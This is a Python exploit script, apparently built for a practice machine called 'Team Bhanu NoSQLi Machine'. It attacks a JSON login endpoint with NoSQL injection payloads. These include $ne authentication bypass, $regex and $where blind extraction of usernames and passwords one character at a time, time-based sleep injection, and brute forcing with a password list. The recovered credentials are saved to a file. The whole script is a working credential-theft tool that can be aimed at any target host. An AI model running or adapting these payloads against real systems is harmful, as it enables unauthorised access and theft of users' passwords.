#!/usr/bin/env python3
"""
Team Bhanu NoSQLi Machine - Enhanced Password Extraction Exploit
This script extracts ALL passwords from the database via NoSQL injection on the login endpoint
"""

import requests
import json
import sys
import time
import string
import argparse
import re
from urllib.parse import quote

class NoSQLiPasswordExtractor:
    def __init__(self, target_ip="127.0.0.1", port=5000):
        self.target_ip = target_ip
        self.port = port
        self.base_url = f"http://{target_ip}:{port}"
        self.session = requests.Session()
        self.extracted_users = {}

    def banner(self):
        print("=" * 70)
        print("ðŸ”¥ Team Bhanu NoSQLi Machine - Password Extraction Exploit")
        print("=" * 70)
        print(f"Target: {self.base_url}")
        print("Objective: Extract ALL passwords from the database")
        print()

    def test_connection(self):
        """Test if the target is reachable"""
        print("[*] Testing connection to target...")
        try:
            response = self.session.get(f"{self.base_url}/login", timeout=10)
            if response.status_code == 200:
                print(f"[âœ“] Target is reachable (Status: {response.status_code})")
                return True
            else:
                print(f"[!] Target responded with status: {response.status_code}")
                return False
        except requests.exceptions.RequestException as e:
            print(f"[âœ—] Connection failed: {e}")
            return False

    def extract_usernames_blind(self):
        """Extract usernames using blind boolean-based NoSQL injection"""
        print("\n[*] Phase 1: Extracting usernames using blind NoSQL injection")
        print("-" * 60)

        login_url = f"{self.base_url}/login"
        headers = {"Content-Type": "application/json"}
        charset = string.ascii_lowercase + string.digits + string.ascii_uppercase + "_-"
        usernames = []

        # First, determine how many users exist using simpler technique
        print("[*] Determining number of users...")
        user_count = 0
        for i in range(1, 100):  # Check up to 99 users
            payload = {
                "username": {"$where": f"db.users.count() >= {i}"},
                "password": {"$ne": None}
            }

            try:
                response = self.session.post(login_url, headers=headers, json=payload, timeout=10)
                if response.status_code == 200 and "dashboard" in response.text.lower():
                    user_count = i
                else:
                    break
            except:
                break


        # Extract usernames using regex enumeration
        print("[*] Extracting usernames using regex...")

        # Try to get all usernames at once
        payload = {
            "username": {"$where": "1==1"},
            "password": {"$ne": None}
        }

        try:
            response = self.session.post(login_url, headers=headers, json=payload, timeout=10)
            if response.status_code == 200 and "dashboard" in response.text.lower():
                print("[+] Found at least one user with $where injection")
        except requests.exceptions.RequestException:
            pass

        # Try specific regex patterns for common usernames
        common_patterns = ["admin", "user", "test", "root", "guest", "demo", "dev"]
        for pattern in common_patterns:
            payload = {
                "username": {"$regex": pattern, "$options": "i"},
                "password": {"$ne": None}
            }

            try:
                response = self.session.post(login_url, headers=headers, json=payload, timeout=10)
                if response.status_code == 200 and "dashboard" in response.text.lower():
                    # Found a username matching this pattern
                    username = self.extract_full_username_blind(pattern)
                    if username and username not in usernames:
                        usernames.append(username)
                        print(f"[+] Found username: {username}")

            except requests.exceptions.RequestException:
                continue

        # Try common usernames directly
        common_usernames = ["admin", "root", "user", "test", "guest", "demo", "administrator",
                           "sa", "oracle", "mysql", "dev", "developer", "sysadmin", "service_backup",
                           "api_user", "monitoring", "user1", "dev1", "testdev", "complex_pass", "special_user"]

        print("[*] Testing common usernames...")
        for username in common_usernames:
            if username not in usernames:
                payload = {
                    "username": username,
                    "password": {"$ne": None}
                }

                try:
                    response = self.session.post(login_url, headers=headers, json=payload, timeout=10)
                    if response.status_code == 200 and "dashboard" in response.text.lower():
                        usernames.append(username)
                        print(f"[+] Found common username: {username}")

                except requests.exceptions.RequestException:
                    continue

        print(f"[âœ“] Total usernames found: {len(usernames)}")
        return usernames

    def extract_full_username_blind(self, start_char):
        """Extract full username using blind NoSQL injection"""
        login_url = f"{self.base_url}/login"
        headers = {"Content-Type": "application/json"}
        charset = string.ascii_lowercase + string.digits + string.ascii_uppercase + "_-"
        username = start_char

        for position in range(1, 25):  # Max username length
            found_char = False

            for char in charset:
                test_username = username + char
                payload = {
                    "username": {"$regex": f"^{test_username}", "$options": "i"},
                    "password": {"$ne": None}
                }

                try:
                    response = self.session.post(login_url, headers=headers, json=payload, timeout=5)
                    if response.status_code == 200 and "dashboard" in response.text.lower():
                        username = test_username
                        found_char = True
                        break
                except:
                    continue

            if not found_char:
                break

        return username

    def extract_password_for_user(self, username):
        """Extract password for a specific user using blind NoSQL injection"""
        print(f"\n[*] Extracting password for user: {username}")
        print("-" * 50)

        login_url = f"{self.base_url}/login"
        headers = {"Content-Type": "application/json"}
        charset = string.ascii_letters + string.digits + string.punctuation + " "
        password = ""

        for position in range(50):  # Max password length
            found_char = False

            # Try each character in the charset
            for char in charset:
                test_password = password + char
                
                # Escape special characters for JavaScript
                escaped_test_password = test_password.replace('\\', '\\\\').replace("'", "\\'")
                escaped_char = char.replace('\\', '\\\\').replace("'", "\\'")

                # Multiple injection techniques for password extraction
                payloads = [
                    # Regex-based extraction
                    {
                        "username": username,
                        "password": {"$regex": f"^{re.escape(test_password)}", "$options": ""}
                    },
                    # JavaScript where clause
                    {
                        "username": username,
                        "password": {
                            "$where": f"this.password.substring(0, {len(test_password)}) == '{escaped_test_password}'"
                        }
                    },

                    # Substr comparison
                    {
                        "username": username,
                        "password": {"$where": f"this.password.charAt({position}) == '{escaped_char}'"}
                    }
                ]

                for payload in payloads:
                    try:
                        response = self.session.post(login_url, headers=headers, json=payload, timeout=10)

                        if response.status_code == 200 and "dashboard" in response.text.lower():
                            password = test_password
                            print(f"[+] Character found: {char} -> Current password: {password}")
                            found_char = True
                            break

                    except requests.exceptions.RequestException:
                        continue

                if found_char:
                    break

            if not found_char:
                break

        if password:
            print(f"[âœ“] Password extracted for {username}: {password}")
            return password
        else:
            print(f"[!] Could not extract password for {username}")
            return None

    def extract_all_passwords_advanced(self):
        """Advanced technique to extract all passwords using JavaScript injection"""
        print("\n[*] Phase 2: Advanced password extraction using JavaScript injection")
        print("-" * 60)

        login_url = f"{self.base_url}/login"
        headers = {"Content-Type": "application/json"}

        # Try to extract all user data at once using simpler techniques
        js_payloads = [
            # Simple true condition to bypass authentication
            "1==1",
            # Check if users collection exists
            "db.users.count() > 0",
            # Try to get admin user
            "this.username == 'admin'",
            # Try to get any user
            "this.username != ''"
        ]

        for js_code in js_payloads:
            payload = {
                "username": {"$where": js_code},
                "password": {"$ne": None}
            }

            try:
                print(f"[*] Trying JavaScript payload: {js_code[:50]}...")
                response = self.session.post(login_url, headers=headers, json=payload, timeout=10)

                if response.status_code == 200:
                    print(f"[*] Response length: {len(response.text)}")
                    if "dashboard" in response.text.lower():
                        print("[+] JavaScript injection successful!")
                        # Try to extract data from response
                        if self.extract_data_from_response(response.text):
                            return True
            except requests.exceptions.RequestException as e:
                print(f"[!] JavaScript injection failed: {e}")
                continue

        return False

    def extract_data_from_response(self, response_text):
        """Extract user data from response"""
        # Look for patterns that might contain user data
        if "username" in response_text.lower() and "password" in response_text.lower():
            print("[+] Found potential user data in response!")
            # Save response for analysis
            with open("response_analysis.html", "w") as f:
                f.write(response_text)
            print("[*] Response saved to response_analysis.html for manual analysis")
            return True
        return False

    def brute_force_passwords(self, usernames):
        """Brute force passwords using common password lists"""
        print("\n[*] Phase 3: Brute force attack on extracted usernames")
        print("-" * 60)

        login_url = f"{self.base_url}/login"
        headers = {"Content-Type": "application/json"}

        # Common passwords based on the database setup
        common_passwords = [
            "admin", "password", "test", "guest", "demo", "root", "123456",
            "password123", "admin123", "root123", "toor", "pass", "1234",
            "Sup3rS3cr3t!", "R00t@2025#Secure", "SysAdmin!2025", "DevSecure123!",
            "Code@2025!", "TestDev456#", "BackupSvc2025!", "ApiAccess@2025",
            "Monitor123#", "OldPass2023!", "Terminated123", "P@$$w0rd!2025",
            "C0mpl3x&Str0ng#2025!", "oracle", "mysql", "sa"
        ]

        successful_logins = {}

        for username in usernames:
            print(f"\n[*] Brute forcing password for: {username}")

            for password in common_passwords:
                payload = {
                    "username": username,
                    "password": password
                }

                try:
                    response = self.session.post(login_url, headers=headers, json=payload, timeout=5)

                    if response.status_code == 200 and "dashboard" in response.text.lower():
                        print(f"[âœ“] SUCCESS! {username}:{password}")
                        successful_logins[username] = password
                        break
                    elif response.status_code == 200 and "invalid" in response.text.lower():
                        continue
                    else:
                        # Try with different timing to detect blind injection
                        time.sleep(0.1)

                except requests.exceptions.RequestException:
                    continue

        return successful_logins

    def extract_via_timing_attack(self, username):
        """Extract password using timing-based blind injection"""
        print(f"\n[*] Attempting timing attack for user: {username}")

        login_url = f"{self.base_url}/login"
        headers = {"Content-Type": "application/json"}
        charset = string.ascii_letters + string.digits + string.punctuation
        password = ""

        for position in range(30):  # Max password length
            found_char = False

            for char in charset:
                # Escape special characters for JavaScript
                escaped_char = char.replace('\\', '\\\\').replace("'", "\\'")
                
                # Time-based payload
                payload = {
                    "username": username,
                    "password": {
                        "$where": f"if (this.password.charAt({position}) == '{escaped_char}') {{ sleep(2000); return true; }} else {{ return false; }}"
                    }
                }

                try:
                    start_time = time.time()
                    response = self.session.post(login_url, headers=headers, json=payload, timeout=5)
                    end_time = time.time()

                    response_time = end_time - start_time

                    if response_time > 1.5:  # Significant delay indicates correct character
                        password += char
                        print(f"[+] Found character: {char} (Time: {response_time:.2f}s)")
                        found_char = True
                        break

                except requests.exceptions.Timeout:
                    # Timeout might indicate correct character
                    password += char
                    print(f"[+] Found character (timeout): {char}")
                    found_char = True
                    break
                except:
                    continue

            if not found_char:
                break

        return password if password else None

    def run_comprehensive_extraction(self):
        """Run comprehensive password extraction"""
        self.banner()

        # Test connection
        if not self.test_connection():
            print("[âœ—] Cannot connect to target. Exiting.")
            return False

        # Extract usernames
        usernames = self.extract_usernames_blind()
        if not usernames:
            print("[!] No usernames found. Trying default list...")
            usernames = ["admin", "root", "user", "test", "guest", "demo"]

        # Try advanced JavaScript injection first
        if self.extract_all_passwords_advanced():
            print("[âœ“] Advanced extraction successful!")

        # Brute force passwords
        successful_logins = self.brute_force_passwords(usernames)

        # Individual password extraction for remaining users
        for username in usernames:
            if username not in successful_logins:
                # Try blind injection
                password = self.extract_password_for_user(username)
                if password:
                    successful_logins[username] = password
                else:
                    # Try timing attack
                    password = self.extract_via_timing_attack(username)
                    if password:
                        successful_logins[username] = password

        # Display results
        print("\n" + "=" * 70)
        print("ðŸ”¥ PASSWORD EXTRACTION RESULTS")
        print("=" * 70)

        if successful_logins:
            print("[âœ“] Successfully extracted passwords:")
            for username, password in successful_logins.items():
                print(f"   {username}:{password}")

            # Save results to file
            with open("extracted_passwords.txt", "w") as f:
                f.write("Team Bhanu NoSQLi Machine - Extracted Passwords\n")
                f.write("=" * 50 + "\n")
                for username, password in successful_logins.items():
                    f.write(f"{username}:{password}\n")

            print(f"\n[âœ“] Results saved to: extracted_passwords.txt")
            print(f"[âœ“] Total passwords extracted: {len(successful_logins)}")

        else:
            print("[!] No passwords were successfully extracted")
            print("[*] Try manual techniques or check target configuration")

        return len(successful_logins) > 0

def main():
    parser = argparse.ArgumentParser(description="Team Bhanu NoSQLi Password Extractor")
    parser.add_argument("--target", "-t", default="127.0.0.1",
                       help="Target IP address (default: 127.0.0.1)")
    parser.add_argument("--port", "-p", type=int, default=5000,
                       help="Target port (default: 5000)")

    args = parser.parse_args()

    extractor = NoSQLiPasswordExtractor(args.target, args.port)
    success = extractor.run_comprehensive_extraction()

    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()
